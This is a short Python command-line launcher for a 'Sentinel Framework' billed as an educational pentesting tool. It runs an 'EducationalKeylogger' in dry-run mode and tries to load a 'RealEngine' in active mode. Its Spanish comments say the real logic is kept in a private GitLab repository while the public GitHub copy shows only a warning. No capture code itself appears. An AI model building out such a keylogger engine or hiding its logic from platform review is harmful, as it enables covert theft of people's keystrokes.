import argparse
from core.examples import EducationalKeylogger


def banner():
    print("""
    #######################################
    #        SENTINEL FRAMEWORK           #
    #   Educational Pentesting Tool       #
    #######################################
    """)


def main():
    banner()
    parser = argparse.ArgumentParser(description="Sentinel Framework Tool")
    parser.add_argument(
        '--mode', choices=['dry-run', 'active', 'test'], default='dry-run',
        help="Select operation mode (default: dry-run)"
    )
    parser.add_argument(
        '--output', type=str, help="Path to save logs (GitLab only)"
    )

    args = parser.parse_args()

    if args.mode == 'dry-run':
        print("[*] Iniciando en MODO EDUCATIVO (Dry Run)...")
        engine = EducationalKeylogger()
        engine.run()
    elif args.mode == 'active':
        # En GitHub, esta sección solo mostraría un mensaje de advertencia.
        # En GitLab, aquí se importaría la lógica real.
        try:
            from core.engine import RealEngine
            print("[!] Iniciando MODO ACTIVO de laboratorio...")
            engine = RealEngine(output=args.output)
            engine.start()
        except ImportError:
            msg = "[ERROR] El motor de laboratorio no está disponible."
            print(msg)
            print("[INFO] Consulte el repositorio privado en GitLab.")
    elif args.mode == 'test':
        msg = "[*] Ejecutando simulación de comportamiento..."
        print(msg)
        # Lógica para inyectar eventos de teclado simulados.


if __name__ == "__main__":
    main()
